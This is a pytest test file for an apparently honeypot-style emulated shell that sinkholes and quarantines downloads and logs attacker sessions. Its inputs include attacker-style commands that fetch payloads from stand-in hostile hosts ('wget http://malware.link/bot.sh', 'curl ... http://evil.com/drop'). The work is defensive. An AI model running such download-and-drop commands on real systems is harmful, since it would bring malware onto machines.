from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest

from llm import NullLLMProvider
from shell import Shell
from vfs import VirtualFileSystem


async def test_wget_creates_vfs_file_and_quarantine(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    vfs = VirtualFileSystem()
    shell = Shell(vfs, llm_provider=NullLLMProvider(), client_ip="203.0.113.9")
    result = await shell.execute("wget http://malware.link/bot.sh")
    contents = vfs.read_file("/root/bot.sh", "/")
    assert "http://malware.link/bot.sh" in contents
    assert "203.0.113.9" in contents
    assert "100%" in result.output
    assert "saved" in result.output
    digest = hashlib.sha256(contents.encode("utf-8")).hexdigest()
    quarantined = Path("quarantine") / digest
    assert quarantined.is_file()
    assert quarantined.read_bytes() == contents.encode("utf-8")


async def test_curl_flag_parsing(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    vfs = VirtualFileSystem()
    shell = Shell(vfs, llm_provider=NullLLMProvider(), client_ip="198.51.100.10")
    result = await shell.execute("curl -o /tmp/custom.bin http://evil.com/drop")
    contents = vfs.read_file("/tmp/custom.bin", "/")
    assert "http://evil.com/drop" in contents
    assert "% Total" in result.output
    silent = await shell.execute("curl -s -o /tmp/quiet.bin http://evil.com/drop")
    assert silent.output == ""
    assert vfs.read_file("/tmp/quiet.bin", "/").startswith("#!/bin/sh")


async def test_redirection_quarantine(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    vfs = VirtualFileSystem()
    shell = Shell(vfs, llm_provider=NullLLMProvider(), client_ip="192.0.2.15")
    result = await shell.execute('echo "evil_eval()" > /tmp/payload.py')
    assert result.output == ""
    written = vfs.read_file("/tmp/payload.py", "/")
    assert written == "evil_eval()\n"
    digest = hashlib.sha256(written.encode("utf-8")).hexdigest()
    quarantined = Path("quarantine") / digest
    assert quarantined.is_file()
    assert quarantined.read_bytes() == written.encode("utf-8")


async def test_jsonl_logging(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    vfs = VirtualFileSystem()
    shell = Shell(
        vfs,
        llm_provider=NullLLMProvider(),
        session_id="sess-abc",
        client_ip="203.0.113.50",
    )
    await shell.execute("pwd")
    await shell.execute("ps aux")
    await shell.execute("wget http://malware.link/bot.sh")
    await shell.execute("getenforce")
    await shell.execute("getenforce")

    log_path = Path("logs/sessions/sess-abc.jsonl")
    assert log_path.is_file()
    records = [json.loads(line) for line in log_path.read_text(encoding="utf-8").splitlines()]
    assert [row["command"] for row in records] == [
        "pwd",
        "ps aux",
        "wget http://malware.link/bot.sh",
        "getenforce",
        "getenforce",
    ]
    assert [row["execution_path"] for row in records] == [
        "vfs",
        "static",
        "sinkhole",
        "llm",
        "cache",
    ]
    for row in records:
        assert row["session_id"] == "sess-abc"
        assert row["client_ip"] == "203.0.113.50"
        assert isinstance(row["timestamp"], str)
        assert "T" in row["timestamp"]
        assert isinstance(row["duration_ms"], float)
        assert row["duration_ms"] >= 0.0
        assert isinstance(row["captured_artifacts"], list)
    wget_record = records[2]
    assert len(wget_record["captured_artifacts"]) == 1
    assert len(wget_record["captured_artifacts"][0]) == 64
    assert records[0]["captured_artifacts"] == []
